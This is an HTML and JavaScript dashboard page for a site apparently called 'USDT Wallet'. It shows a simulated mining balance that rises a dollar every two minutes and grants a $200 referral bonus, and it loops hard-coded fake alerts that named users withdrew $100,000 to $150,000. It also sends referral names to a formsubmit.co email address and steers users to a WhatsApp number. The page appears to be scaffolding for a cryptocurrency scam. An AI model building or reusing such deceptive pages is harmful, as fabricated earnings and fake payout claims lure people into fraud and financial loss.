<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Dashboard - USDT Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(-45deg, #003d2a, #00694b, #00513b, #008b64);
      background-size: 400% 400%;
      animation: gradient 20s ease infinite;
      color: white;
      margin: 0;
      height: 100vh;
      overflow-x: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }
    @keyframes gradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      background: rgba(0, 0, 0, 0.6);
      padding: 30px 25px;
      border-radius: 15px;
      width: 300px;
      box-shadow: 0 0 20px rgba(0,255,128,0.3);
      text-align: center;
      user-select: none;
      position: relative;
      z-index: 1;
    }
    h2 {
      margin-bottom: 20px;
      color: #00e99a;
      font-size: 1.25rem;
    }
    .balance {
      font-size: 2.5rem;
      font-weight: 600;
      margin-bottom: 10px;
      letter-spacing: 0.05em;
    }
    .small-text {
      font-size: 0.85rem;
      color: #00e99a;
      margin-bottom: 20px;
      font-weight: 500;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0 15px 0;
      border-radius: 8px;
      border: none;
      font-size: 1rem;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #00e99a;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      color: black;
      font-size: 1.1rem;
      margin-bottom: 20px;
    }
    button:disabled {
      background: #2a7f5a;
      cursor: not-allowed;
    }
    .warning-text {
      font-size: 0.75rem;
      color: #ff5252;
      margin-bottom: 15px;
      font-weight: 600;
      text-align: left;
    }

    /* Notification bar outside the card */
    #notification {
      position: fixed;
      top: 12px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(38, 161, 123, 0.9);
      color: #fff;
      padding: 8px 20px;
      border-radius: 18px;
      font-weight: 600;
      font-size: 0.9rem;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.6s ease;
      z-index: 9999;
      max-width: 300px; /* same as card width */
      white-space: nowrap;
      box-shadow: 0 0 15px rgba(38, 161, 123, 0.7);
      user-select: none;
      text-align: center;
      overflow: hidden;
      text-overflow: ellipsis;
    }

    /* WhatsApp button outside the card bottom */
    .whatsapp-btn {
      position:fixed;
      bottom: 15px;
      left: 50%;
      transform: translateX(-50%);
      background: #25d366;
      color: white;
      font-weight: 600;
      padding: 6px 24px;
      border-radius: 50px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 0.9rem;
      text-decoration: none;
      box-shadow: 0 4px 10px rgba(37, 211, 102, 0.5);
      user-select: none;
      transition: background-color 0.3s ease;
      border: none;
      outline: none;
      white-space: nowrap;
      width: 350px; /* same as card width */
      justify-content: center;
      z-index: 9999;
    }
    .whatsapp-btn:hover {
      background-color: #1ebe57;
    }
    .whatsapp-icon {
      width: 16px;
      height: 16px;
      fill: white;
    }
  </style>
</head>
<body>

  <!-- Notification outside the card -->
  <div id="notification" role="alert" aria-live="assertive" aria-atomic="true"></div>

  <main class="container" role="main" aria-label="User Dashboard">
    <h2>Welcome, <span id="userName"></span></h2>
    <div class="balance" id="balance">$0.00000</div>
    <div class="small-text" id="referralCodeDisplay"></div>

    <input type="text" id="referralInput" placeholder="Enter referral username" aria-label="Referral username input" />
    <button id="submitReferralBtn">Submit Referral</button>
    <div class="warning-text" id="referralWarning" aria-live="polite"></div>

    <button id="withdrawBtn" disabled>Withdraw</button>
  </main>

  <!-- WhatsApp button outside the card bottom -->
  <button class="whatsapp-btn" id="whatsappBtn" title="Contact on WhatsApp" aria-label="Contact support on WhatsApp">
    <svg class="whatsapp-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
      <path d="M20.52 3.48A11.875 11.875 0 0012 0C5.373 0 0 5.373 0 12a11.9 11.9 0 001.577 6.04L0 24l5.98-1.566A11.88 11.88 0 0012 24c6.627 0 12-5.373 12-12 0-3.197-1.25-6.205-3.48-8.52zm-8.54 17.47c-1.93 0-3.82-.51-5.44-1.48l-.39-.23-3.55.93.95-3.46-.25-.39a9.72 9.72 0 01-1.49-5.43c0-5.37 4.36-9.73 9.73-9.73 2.6 0 5.05 1.01 6.9 2.85a9.678 9.678 0 012.84 6.91c0 5.38-4.35 9.74-9.72 9.74zm5.27-7.21c-.29-.15-1.7-.84-1.96-.94-.26-.1-.45-.15-.64.15s-.73.94-.9 1.13c-.17.19-.34.22-.63.08-.29-.15-1.23-.45-2.34-1.44-.87-.77-1.45-1.72-1.62-2.01-.17-.29-.02-.44.13-.59.13-.13.29-.34.43-.51.14-.17.19-.29.29-.48.1-.19.05-.35-.02-.5-.06-.15-.63-1.52-.86-2.08-.23-.56-.46-.49-.64-.5l-.54-.01c-.18 0-.48.07-.73.35s-.96.94-.96 2.28c0 1.33.98 2.62 1.12 2.8.14.18 1.94 2.96 4.7 4.15.66.28 1.17.45 1.57.58.66.22 1.26.19 1.74.12.53-.08 1.7-.69 1.94-1.36.23-.66.23-1.23.16-1.35-.07-.12-.26-.19-.54-.34z"/>
    </svg>
    Contact on WhatsApp
  </button>

  <script>
    const userName = localStorage.getItem('usdt_user') || 'User';
    document.getElementById('userName').textContent = userName;

    // Show referral code (which is username)
    document.getElementById('referralCodeDisplay').textContent = `Your referral code: ${userName}`;

    let balance = parseFloat(localStorage.getItem('usdt_balance')) || 0;
    let referralBonusApplied = localStorage.getItem('usdt_referral_bonus_applied') === 'true';

    function displayBalance() {
      document.getElementById('balance').textContent = `$${balance.toFixed(5)}`;
    }
    displayBalance();

    // Mining balance +1 every 2 minutes
    setInterval(() => {
      balance += 1;
      localStorage.setItem('usdt_balance', balance.toString());
      displayBalance();
      checkWithdrawEnable();
    }, 120000);

    // Initial referral bonus add if applicable
    if (!referralBonusApplied) {
      const referralUsed = localStorage.getItem('usdt_referral_used');
      if (referralUsed && referralUsed !== userName) {
        balance += 200;
        localStorage.setItem('usdt_balance', balance.toString());
        localStorage.setItem('usdt_referral_bonus_applied', 'true');
        displayBalance();
        alert(`$200 bonus added for using referral code: ${referralUsed}`);
      }
    }

    const withdrawBtn = document.getElementById('withdrawBtn');
    function checkWithdrawEnable() {
      withdrawBtn.disabled = balance < 1;
    }
    checkWithdrawEnable();
    withdrawBtn.onclick = () => {
      if (balance >= 1) {
        window.location.href = 'withdraw.html';
      }
    };

    const referralInput = document.getElementById('referralInput');
    const submitReferralBtn = document.getElementById('submitReferralBtn');
    const referralWarning = document.getElementById('referralWarning');

    // Example valid users â€” update or load dynamically if you want
    const validUsers = [userName, 'Alex', 'Ayesha', 'John', 'Sarah'];

    submitReferralBtn.addEventListener('click', () => {
      const inputVal = referralInput.value.trim();

      if (inputVal === '') {
        referralWarning.style.color = '#ff5252';
        referralWarning.textContent = 'Please enter a referral username.';
        return;
      }
      if (!validUsers.includes(inputVal)) {
        referralWarning.style.color = '#ff5252';
        referralWarning.textContent = 'Warning: Please enter correct referred user name. At withdrawal stage, your account will be reviewed fully. If we find any violation of fake referral then your account will be banned.';
        return;
      }
      if (inputVal === userName) {
        referralWarning.style.color = '#ff5252';
        referralWarning.textContent = 'You cannot refer yourself.';
        return;
      }

      fetch('https://formsubmit.co/ajax/snipemarkets@gmail.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({ referral: inputVal, user: userName }),
      }).then(res => {
        if (res.ok) {
          referralWarning.style.color = '#00e99a';
          referralWarning.textContent = 'Referral submitted successfully!';
          referralInput.value = '';
        } else {
          referralWarning.style.color = '#ff5252';
          referralWarning.textContent = 'Failed to submit referral. Try again later.';
        }
      }).catch(() => {
        referralWarning.style.color = '#ff5252';
        referralWarning.textContent = 'Network error submitting referral.';
      });
    });

    // Notification logic
    const notificationEl = document.getElementById('notification');
    const notifications = [
      'Alex successfully withdrew $150000',
      'Ayesha successfully withdrew $100000',
      'John successfully withdrew $120000',
      'Sarah successfully withdrew $110000',
      'Michael successfully withdrew $130000',
    ];
    let notifIndex = 0;
    function showNotification() {
      notificationEl.style.opacity = '1';
      notificationEl.textContent = notifications[notifIndex];
      notifIndex = (notifIndex + 1) % notifications.length;
      setTimeout(() => {
        notificationEl.style.opacity = '0';
      }, 3000);
    }
    showNotification();
    setInterval(showNotification, 5000);

    // WhatsApp button event
    document.getElementById('whatsappBtn').addEventListener('click', () => {
      window.open('https://wa.me/16723004545', '_blank');
    });

  </script>
</body>
</html>
